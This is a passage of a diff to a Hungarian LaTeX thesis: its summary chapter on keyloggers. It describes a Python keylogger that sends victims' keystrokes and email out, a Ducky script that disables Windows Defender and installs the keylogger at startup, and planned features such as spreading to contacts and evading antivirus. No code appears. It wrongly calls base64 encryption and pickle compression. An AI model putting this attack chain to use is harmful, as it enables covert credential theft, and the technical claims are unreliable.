+Az adatokra lehet kapni példát a projektet tároló github linken: https://github.com/zsfelmeri/Keylogger\_collegeCertificate.
+
+\chapter{Összefoglaló}\label{sec:conc}
+Dolgozatomban a keyloggerek működését tanulmányoztam különböző operációs rendszereken. Először meghatározásra került a keylogger és a hozzátartozó fogalmak, majd megvizsgáltuk a keylogger típusait: Wireless, Hardver, Szoftver, Akusztikus. Ezek közül a leginkább használatosak a Hardver és a Szoftver alapú keyloggerek. Továbbá a keyloggerek elleni védekezés is tanulmányozva volt. A keyloggerek elleni védekezés szempontjából két típusu rendszert értelmeztünk: aláírás alapú és horog alapú. Ezek után az általam fejlesztett szoftverek kerültek bemutatásra, amelyeket Python nyelven írtam meg, és egy Hacker szemszögéből lettek kivitelezve. A három szoftver alatt a Hacker szoftverét, a Target szoftverét és a GUI-t értem. A Hacker oldalon monitorizálva vannak az adatok, amelyeket a Target oldalról kapunk. A GUI a Hacker oldalhoz tartozik, szerepe a valós időben való megjelenítése a lenyomott billentyűknek. A keyloggert úgy fejlesztettem, hogy több funkcionalitással rendelkezzen, mint egy átlagos keylogger. Az adatok átvitelére a ZeroMQ, egy magasabb szintű protokollt alkalmaztunk. A keylogger email-t is tud küldeni az áldozat gépéről, ehhez viszont konfigurálni kellett egy gmail fiókot. Az adatokat el lehet fogni a hálózaton, ezért úgy döntöttünk, hogy elküldés előtt titkosítsuk és tömörítsük azokat. A titkosításhoz a Python nyelv base64 modultját és a tömörítéshez a pickle modulját használtuk. A Hacker feladatához tartozik az is, hogy a python kódból futtatható állományt készítsen. Ezt a pyinstaller modul segítségével volt kivitelezve. Tesztelés során megnéztük, hogy melyik operációs rendszeren (Windows, Linux, Mac) tudjuk ellopni a felhasználó jelszavát. Sikeresnek nyilvánult a Linux rendszeren való jelszó megszerzése. Legvégül elemeztük a Ducky szkriptet, amely kikapcsolta a Windows Defender-t, letöltötte az általunk fejlesztett keyloggert, bemásolta a Startup mappába, és elindította a szoftvert.
+
+\section{Továbbfejlesztési lehetőségek}
+A szoftvert, természetesen továbbfejleszteni is lehet. Pár lehetőség erre a célra:
+\begin{itemize}
+\item Tobábbküldeni a keyloggert az áldozat ismerőseinek
+\item Vágólap elfogása
+\item Egyszerre több számítógép monitorizálása
+\item Anti virus megtévesztése
+\end{itemize}
 
 % table of figures
 \renewcommand{\listfigurename}{Ábrák jegyzéke}
@@ -880,7 +1005,5 @@ A tesztek eredményei teljesen megeggyeztek a virtuális gépeken való tesztek 
 \thispagestyle{empty}
 
 \printbibliography
-
-\chapter{Függelék}\label{sec:dep}
 
 \end{document}
